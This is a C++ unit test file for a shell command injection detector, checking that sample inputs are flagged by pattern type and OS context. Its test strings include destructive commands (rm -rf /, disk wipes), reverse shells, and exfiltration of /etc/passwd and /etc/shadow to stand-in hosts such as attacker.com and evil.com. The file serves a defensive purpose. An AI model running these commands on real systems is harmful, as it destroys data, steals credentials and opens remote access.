/**
 * @file test_shell_detector.cpp
 * @brief Unit Tests for Shell Command Injection Detection
 *
 * WHAT: Comprehensive unit tests for shell injection detection module
 * WHY:  Ensure all attack patterns are detected correctly
 * HOW:  Test each pattern type, OS contexts, edge cases, and configurations
 *
 * @author NIMCP Team
 * @date 2025-12-07
 */

#include <gtest/gtest.h>

// Headers have their own extern "C" guards
#include "security/nimcp_shell_detector.h"
#include "utils/memory/nimcp_memory.h"
#include "utils/logging/nimcp_logging.h"

//=============================================================================
// Test Fixture
//=============================================================================

class ShellDetectorTest : public ::testing::Test {
protected:
    nimcp_shell_detector_t detector;
    nimcp_shell_detector_config_t config;

    void SetUp() override {
        /* Get default config */
        config = nimcp_shell_detector_default_config();

        /* Create detector with default config */
        detector = nimcp_shell_detector_create(&config);
        ASSERT_NE(nullptr, detector);
    }

    void TearDown() override {
        if (detector) {
            nimcp_shell_detector_destroy(detector);
            detector = nullptr;
        }
    }

    /* Helper: Detect and expect threat */
    void expect_threat(const char* input, nimcp_shell_pattern_t expected_pattern,
                      nimcp_shell_context_t context = NIMCP_SHELL_CONTEXT_AUTO) {
        nimcp_shell_detection_result_t result;
        nimcp_shell_error_t err = nimcp_shell_detect(detector, input,
                                                      context, &result);

        EXPECT_EQ(NIMCP_SHELL_ERROR_THREAT_DETECTED, err) << "Input: " << input;
        EXPECT_FALSE(result.valid) << "Input: " << input;
        EXPECT_EQ(expected_pattern, result.pattern) << "Input: " << input;
        EXPECT_GT(result.severity, NIMCP_SHELL_SEVERITY_NONE) << "Input: " << input;
    }

    /* Helper: Detect and expect success */
    void expect_success(const char* input,
                       nimcp_shell_context_t context = NIMCP_SHELL_CONTEXT_AUTO) {
        nimcp_shell_detection_result_t result;
        nimcp_shell_error_t err = nimcp_shell_detect(detector, input,
                                                      context, &result);

        EXPECT_EQ(NIMCP_SHELL_SUCCESS, err) << "Input: " << input;
        EXPECT_TRUE(result.valid) << "Input: " << input;
        EXPECT_EQ(NIMCP_SHELL_PATTERN_NONE, result.pattern) << "Input: " << input;
    }
};

//=============================================================================
// Basic Tests
//=============================================================================

TEST_F(ShellDetectorTest, CreateDestroy) {
    /* Test create/destroy cycle */
    nimcp_shell_detector_t d = nimcp_shell_detector_create(nullptr);
    ASSERT_NE(nullptr, d);
    nimcp_shell_detector_destroy(d);
}

TEST_F(ShellDetectorTest, NullParameters) {
    nimcp_shell_detection_result_t result;

    /* NULL detector */
    nimcp_shell_error_t err = nimcp_shell_detect(
        nullptr, "test", NIMCP_SHELL_CONTEXT_AUTO, &result);
    EXPECT_EQ(NIMCP_SHELL_ERROR_NULL_POINTER, err);

    /* NULL input */
    err = nimcp_shell_detect(detector, nullptr,
                             NIMCP_SHELL_CONTEXT_AUTO, &result);
    EXPECT_EQ(NIMCP_SHELL_ERROR_NULL_POINTER, err);

    /* NULL result */
    err = nimcp_shell_detect(detector, "test",
                             NIMCP_SHELL_CONTEXT_AUTO, nullptr);
    EXPECT_EQ(NIMCP_SHELL_ERROR_INVALID_PARAM, err);
}

TEST_F(ShellDetectorTest, EmptyInput) {
    expect_success("");
}

TEST_F(ShellDetectorTest, SafeInputs) {
    expect_success("hello world");
    expect_success("test123");
    expect_success("file-name.txt");
    expect_success("user@example.com");
    expect_success("data_2024_01_15");
    expect_success("192.168.1.1");
}

//=============================================================================
// Command Separator Tests
//=============================================================================

TEST_F(ShellDetectorTest, Separator_Semicolon) {
    expect_threat("echo hello; rm -rf /", NIMCP_SHELL_PATTERN_SEPARATOR);
    expect_threat("ls; cat /etc/passwd", NIMCP_SHELL_PATTERN_SEPARATOR);
    expect_threat("valid_cmd;malicious_cmd", NIMCP_SHELL_PATTERN_SEPARATOR);
}

TEST_F(ShellDetectorTest, Separator_DoubleAmpersand) {
    expect_threat("echo test && rm -rf /", NIMCP_SHELL_PATTERN_SEPARATOR);
    expect_threat("true && cat /etc/passwd", NIMCP_SHELL_PATTERN_SEPARATOR);
}

TEST_F(ShellDetectorTest, Separator_DoublePipe) {
    expect_threat("false || wget malicious.com/script",
                  NIMCP_SHELL_PATTERN_SEPARATOR);
    expect_threat("test || curl evil.com", NIMCP_SHELL_PATTERN_SEPARATOR);
}

TEST_F(ShellDetectorTest, Separator_Pipe) {
    expect_threat("cat file | nc attacker.com 1234",
                  NIMCP_SHELL_PATTERN_SEPARATOR);
    expect_threat("ls | grep secret", NIMCP_SHELL_PATTERN_SEPARATOR);
}

TEST_F(ShellDetectorTest, Separator_Ampersand) {
    expect_threat("rm -rf / &", NIMCP_SHELL_PATTERN_SEPARATOR);
    expect_threat("malicious_cmd &", NIMCP_SHELL_PATTERN_SEPARATOR);
}

TEST_F(ShellDetectorTest, Separator_Newline) {
    expect_threat("echo test\nrm -rf /", NIMCP_SHELL_PATTERN_SEPARATOR);
    expect_threat("valid\rmalicious", NIMCP_SHELL_PATTERN_SEPARATOR);
}

//=============================================================================
// Command Substitution Tests
//=============================================================================

TEST_F(ShellDetectorTest, Substitution_DollarParens) {
    expect_threat("$(rm -rf /)", NIMCP_SHELL_PATTERN_SUBSTITUTION);
    expect_threat("echo $(cat /etc/passwd)", NIMCP_SHELL_PATTERN_SUBSTITUTION);
    expect_threat("$(wget malicious.com/script)", NIMCP_SHELL_PATTERN_SUBSTITUTION);
}

TEST_F(ShellDetectorTest, Substitution_Backticks) {
    expect_threat("`rm -rf /`", NIMCP_SHELL_PATTERN_SUBSTITUTION);
    expect_threat("echo `cat /etc/passwd`", NIMCP_SHELL_PATTERN_SUBSTITUTION);
    expect_threat("`wget evil.com/shell`", NIMCP_SHELL_PATTERN_SUBSTITUTION);
}

TEST_F(ShellDetectorTest, Substitution_DollarBraces) {
    expect_threat("${PATH}", NIMCP_SHELL_PATTERN_SUBSTITUTION);
    expect_threat("test ${malicious}", NIMCP_SHELL_PATTERN_SUBSTITUTION);
}

TEST_F(ShellDetectorTest, Substitution_Arithmetic) {
    expect_threat("$((1+1))", NIMCP_SHELL_PATTERN_SUBSTITUTION);
}

//=============================================================================
// Dangerous Unix Command Tests
//=============================================================================

TEST_F(ShellDetectorTest, DangerousUnix_RemoveCommands) {
    expect_threat("rm -rf /", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
    expect_threat("rm /etc/passwd", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
}

TEST_F(ShellDetectorTest, DangerousUnix_DiskDestruction) {
    expect_threat("dd if=/dev/zero of=/dev/sda",
                  NIMCP_SHELL_PATTERN_DANGEROUS_CMD, NIMCP_SHELL_CONTEXT_UNIX);
    expect_threat("mkfs.ext4 /dev/sda1", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
}

TEST_F(ShellDetectorTest, DangerousUnix_DataExfiltration) {
    expect_threat("wget attacker.com/malware", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
    expect_threat("curl evil.com/script", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
    expect_threat("nc attacker.com 1234", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
    expect_threat("netcat -l 4444", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
}

TEST_F(ShellDetectorTest, DangerousUnix_PermissionChanges) {
    expect_threat("chmod 777 /etc/shadow", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
    expect_threat("chown attacker:attacker /etc/passwd",
                  NIMCP_SHELL_PATTERN_DANGEROUS_CMD, NIMCP_SHELL_CONTEXT_UNIX);
}

TEST_F(ShellDetectorTest, DangerousUnix_SensitiveFiles) {
    expect_threat("cat /etc/passwd", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
    expect_threat("cat /etc/shadow", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
}

TEST_F(ShellDetectorTest, DangerousUnix_ShellInvocation) {
    expect_threat("/bin/sh", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
    expect_threat("/bin/bash", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
    expect_threat("/bin/dash", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
    expect_threat("sh -c 'malicious'", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
    expect_threat("bash -c 'evil'", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
}

TEST_F(ShellDetectorTest, DangerousUnix_PrivilegeEscalation) {
    expect_threat("sudo rm -rf /", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
    expect_threat("su root", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
}

TEST_F(ShellDetectorTest, DangerousUnix_CodeExecution) {
    expect_threat("exec /bin/sh", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
    expect_threat("eval 'malicious code'", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
    expect_threat("perl -e 'system()'", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
    expect_threat("python -c 'import os'", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
    expect_threat("ruby -e 'system()'", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
}

TEST_F(ShellDetectorTest, DangerousUnix_ProcessControl) {
    expect_threat("kill -9 1234", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
    expect_threat("killall nginx", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
    expect_threat("pkill ssh", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
}

TEST_F(ShellDetectorTest, DangerousUnix_SystemControl) {
    expect_threat("reboot", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
    expect_threat("shutdown -h now", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
    expect_threat("init 0", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_UNIX);
}

//=============================================================================
// Dangerous Windows Command Tests
//=============================================================================

TEST_F(ShellDetectorTest, DangerousWindows_ShellInvocation) {
    expect_threat("cmd.exe /c dir", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_WINDOWS);
    expect_threat("cmd /c malicious", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_WINDOWS);
    expect_threat("powershell -Command Get-Process",
                  NIMCP_SHELL_PATTERN_DANGEROUS_CMD, NIMCP_SHELL_CONTEXT_WINDOWS);
}

TEST_F(ShellDetectorTest, DangerousWindows_FileOperations) {
    expect_threat("del C:\\important.txt", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_WINDOWS);
    expect_threat("erase *.txt", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_WINDOWS);
    expect_threat("format C:", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_WINDOWS);
    expect_threat("rd /s /q C:\\data", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_WINDOWS);
}

TEST_F(ShellDetectorTest, DangerousWindows_UserManagement) {
    expect_threat("net user hacker password123 /add",
                  NIMCP_SHELL_PATTERN_DANGEROUS_CMD, NIMCP_SHELL_CONTEXT_WINDOWS);
    expect_threat("net share C$=C:\\", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_WINDOWS);
}

TEST_F(ShellDetectorTest, DangerousWindows_Registry) {
    expect_threat("reg add HKLM\\SOFTWARE", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_WINDOWS);
    expect_threat("reg delete HKCU\\Software",
                  NIMCP_SHELL_PATTERN_DANGEROUS_CMD, NIMCP_SHELL_CONTEXT_WINDOWS);
}

TEST_F(ShellDetectorTest, DangerousWindows_Services) {
    expect_threat("sc create malicious", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_WINDOWS);
    expect_threat("schtasks /create", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_WINDOWS);
}

TEST_F(ShellDetectorTest, DangerousWindows_SystemControl) {
    expect_threat("shutdown /s", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_WINDOWS);
    expect_threat("taskkill /F /IM explorer.exe",
                  NIMCP_SHELL_PATTERN_DANGEROUS_CMD, NIMCP_SHELL_CONTEXT_WINDOWS);
}

TEST_F(ShellDetectorTest, DangerousWindows_ScriptingEngines) {
    expect_threat("wscript malicious.vbs", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_WINDOWS);
    expect_threat("cscript evil.js", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_WINDOWS);
    expect_threat("mshta http://evil.com", NIMCP_SHELL_PATTERN_DANGEROUS_CMD,
                  NIMCP_SHELL_CONTEXT_WINDOWS);
}

//=============================================================================
// I/O Redirection Tests
//=============================================================================

TEST_F(ShellDetectorTest, Redirection_OutputOverwrite) {
    expect_threat("echo malicious > /etc/passwd",
                  NIMCP_SHELL_PATTERN_REDIRECTION);
    expect_threat("cat data > sensitive.txt", NIMCP_SHELL_PATTERN_REDIRECTION);
}

TEST_F(ShellDetectorTest, Redirection_OutputAppend) {
    expect_threat("echo backdoor >> ~/.bashrc", NIMCP_SHELL_PATTERN_REDIRECTION);
}

TEST_F(ShellDetectorTest, Redirection_Input) {
    expect_threat("mail attacker@evil.com < /etc/passwd",
                  NIMCP_SHELL_PATTERN_REDIRECTION);
}

TEST_F(ShellDetectorTest, Redirection_StderrRedirect) {
    expect_threat("malicious 2> /dev/null", NIMCP_SHELL_PATTERN_REDIRECTION);
    /* Note: 2>&1 contains >& which is detected as separator first */
    expect_threat("evil 2>&1", NIMCP_SHELL_PATTERN_SEPARATOR);
}

TEST_F(ShellDetectorTest, Redirection_HereString) {
    expect_threat("cat <<< data", NIMCP_SHELL_PATTERN_REDIRECTION);
}

//=============================================================================
// Newline Injection Tests
//=============================================================================

TEST_F(ShellDetectorTest, Newline_URLEncoded) {
    expect_threat("test%0amalicious", NIMCP_SHELL_PATTERN_NEWLINE);
    expect_threat("valid%0dexploit", NIMCP_SHELL_PATTERN_NEWLINE);
    expect_threat("cmd%0Aevil", NIMCP_SHELL_PATTERN_NEWLINE);
    expect_threat("safe%0Dbad", NIMCP_SHELL_PATTERN_NEWLINE);
}

TEST_F(ShellDetectorTest, Newline_Escaped) {
    expect_threat("test\\nmalicious", NIMCP_SHELL_PATTERN_NEWLINE);
    expect_threat("valid\\rexploit", NIMCP_SHELL_PATTERN_NEWLINE);
}

//=============================================================================
// Environment Manipulation Tests
//=============================================================================

TEST_F(ShellDetectorTest, Environment_Export) {
    expect_threat("export PATH=/tmp:$PATH", NIMCP_SHELL_PATTERN_ENVIRONMENT);
    expect_threat("export MALICIOUS=value", NIMCP_SHELL_PATTERN_ENVIRONMENT);
}

TEST_F(ShellDetectorTest, Environment_Set) {
    expect_threat("set PATH=C:\\malicious", NIMCP_SHELL_PATTERN_ENVIRONMENT);
}

TEST_F(ShellDetectorTest, Environment_Env) {
    expect_threat("env EVIL=1 command", NIMCP_SHELL_PATTERN_ENVIRONMENT);
}

TEST_F(ShellDetectorTest, Environment_DirectAssignment) {
    expect_threat("PATH=/tmp", NIMCP_SHELL_PATTERN_ENVIRONMENT);
    expect_threat("LD_LIBRARY_PATH=/evil", NIMCP_SHELL_PATTERN_ENVIRONMENT);
    expect_threat("LD_PRELOAD=/tmp/evil.so", NIMCP_SHELL_PATTERN_ENVIRONMENT);
    /* Note: IFS=$'\n' contains \n which is detected as newline first */
    expect_threat("IFS=$'\\n'", NIMCP_SHELL_PATTERN_NEWLINE);
}

//=============================================================================
// Sanitization Tests
//=============================================================================

TEST_F(ShellDetectorTest, Sanitize_RemoveMetachars) {
    char output[256];
    nimcp_shell_error_t err;

    err = nimcp_shell_sanitize(detector, "hello; world", output, sizeof(output));
    EXPECT_EQ(NIMCP_SHELL_SUCCESS, err);
    EXPECT_STREQ("hello world", output);

    err = nimcp_shell_sanitize(detector, "test$(bad)", output, sizeof(output));
    EXPECT_EQ(NIMCP_SHELL_SUCCESS, err);
    EXPECT_STREQ("testbad", output);

    err = nimcp_shell_sanitize(detector, "file>output", output, sizeof(output));
    EXPECT_EQ(NIMCP_SHELL_SUCCESS, err);
    EXPECT_STREQ("fileoutput", output);
}

TEST_F(ShellDetectorTest, Sanitize_KeepSafeChars) {
    char output[256];
    nimcp_shell_error_t err;

    err = nimcp_shell_sanitize(detector, "safe_file-123.txt",
                               output, sizeof(output));
    EXPECT_EQ(NIMCP_SHELL_SUCCESS, err);
    EXPECT_STREQ("safe_file-123.txt", output);

    err = nimcp_shell_sanitize(detector, "user@example.com",
                               output, sizeof(output));
    EXPECT_EQ(NIMCP_SHELL_SUCCESS, err);
    EXPECT_STREQ("user@example.com", output);
}

//=============================================================================
// Statistics Tests
//=============================================================================

TEST_F(ShellDetectorTest, Statistics_Tracking) {
    nimcp_shell_detection_result_t result;
    nimcp_shell_detector_stats_t stats;

    /* Initial stats should be zero */
    nimcp_shell_detector_get_stats(detector, &stats);
    EXPECT_EQ(0, stats.total_detections);
    EXPECT_EQ(0, stats.threats_detected);

    /* Detect some commands */
    nimcp_shell_detect(detector, "safe", NIMCP_SHELL_CONTEXT_AUTO, &result);
    nimcp_shell_detect(detector, "rm -rf /", NIMCP_SHELL_CONTEXT_AUTO, &result);
    nimcp_shell_detect(detector, "also safe", NIMCP_SHELL_CONTEXT_AUTO, &result);
    nimcp_shell_detect(detector, "echo test; malicious",
                      NIMCP_SHELL_CONTEXT_AUTO, &result);

    /* Check updated stats */
    nimcp_shell_detector_get_stats(detector, &stats);
    EXPECT_EQ(4, stats.total_detections);
    EXPECT_EQ(2, stats.threats_detected);
}

TEST_F(ShellDetectorTest, Statistics_Reset) {
    nimcp_shell_detection_result_t result;
    nimcp_shell_detector_stats_t stats;

    /* Generate some stats */
    nimcp_shell_detect(detector, "rm -rf /", NIMCP_SHELL_CONTEXT_AUTO, &result);
    nimcp_shell_detector_get_stats(detector, &stats);
    EXPECT_GT(stats.total_detections, 0);

    /* Reset */
    nimcp_shell_error_t err = nimcp_shell_detector_reset_stats(detector);
    EXPECT_EQ(NIMCP_SHELL_SUCCESS, err);

    /* Check stats are zero */
    nimcp_shell_detector_get_stats(detector, &stats);
    EXPECT_EQ(0, stats.total_detections);
    EXPECT_EQ(0, stats.threats_detected);
}

//=============================================================================
// Utility Function Tests
//=============================================================================

TEST_F(ShellDetectorTest, PatternName) {
    EXPECT_STREQ("NONE", nimcp_shell_pattern_name(NIMCP_SHELL_PATTERN_NONE));
    EXPECT_STREQ("SEPARATOR",
                 nimcp_shell_pattern_name(NIMCP_SHELL_PATTERN_SEPARATOR));
    EXPECT_STREQ("SUBSTITUTION",
                 nimcp_shell_pattern_name(NIMCP_SHELL_PATTERN_SUBSTITUTION));
    EXPECT_STREQ("DANGEROUS_CMD",
                 nimcp_shell_pattern_name(NIMCP_SHELL_PATTERN_DANGEROUS_CMD));
    EXPECT_STREQ("REDIRECTION",
                 nimcp_shell_pattern_name(NIMCP_SHELL_PATTERN_REDIRECTION));
    EXPECT_STREQ("NEWLINE",
                 nimcp_shell_pattern_name(NIMCP_SHELL_PATTERN_NEWLINE));
    EXPECT_STREQ("ENVIRONMENT",
                 nimcp_shell_pattern_name(NIMCP_SHELL_PATTERN_ENVIRONMENT));
}

TEST_F(ShellDetectorTest, SeverityName) {
    EXPECT_STREQ("NONE", nimcp_shell_severity_name(NIMCP_SHELL_SEVERITY_NONE));
    EXPECT_STREQ("LOW", nimcp_shell_severity_name(NIMCP_SHELL_SEVERITY_LOW));
    EXPECT_STREQ("MEDIUM",
                 nimcp_shell_severity_name(NIMCP_SHELL_SEVERITY_MEDIUM));
    EXPECT_STREQ("HIGH", nimcp_shell_severity_name(NIMCP_SHELL_SEVERITY_HIGH));
    EXPECT_STREQ("CRITICAL",
                 nimcp_shell_severity_name(NIMCP_SHELL_SEVERITY_CRITICAL));
}

//=============================================================================
// Real-World Attack Examples
//=============================================================================

TEST_F(ShellDetectorTest, RealWorld_ClassicInjection) {
    expect_threat("127.0.0.1; rm -rf /", NIMCP_SHELL_PATTERN_SEPARATOR);
    expect_threat("file.txt && cat /etc/passwd", NIMCP_SHELL_PATTERN_SEPARATOR);
}

TEST_F(ShellDetectorTest, RealWorld_ReverseShell) {
    expect_threat("nc attacker.com 4444 -e /bin/sh",
                  NIMCP_SHELL_PATTERN_DANGEROUS_CMD);
    /* Note: bash -i >& contains >& which is detected as separator first */
    expect_threat("bash -i >& /dev/tcp/attacker.com/4444 0>&1",
                  NIMCP_SHELL_PATTERN_SEPARATOR);
}

TEST_F(ShellDetectorTest, RealWorld_DataExfiltration) {
    expect_threat("curl http://attacker.com/$(cat /etc/passwd)",
                  NIMCP_SHELL_PATTERN_SUBSTITUTION);
    expect_threat("wget http://evil.com --post-file=/etc/shadow",
                  NIMCP_SHELL_PATTERN_DANGEROUS_CMD);
}

TEST_F(ShellDetectorTest, RealWorld_PrivilegeEscalation) {
    expect_threat("sudo su - && cat /etc/shadow",
                  NIMCP_SHELL_PATTERN_SEPARATOR);
}

//=============================================================================
// Main
//=============================================================================

int main(int argc, char** argv) {
    testing::InitGoogleTest(&argc, argv);
    return RUN_ALL_TESTS();
}
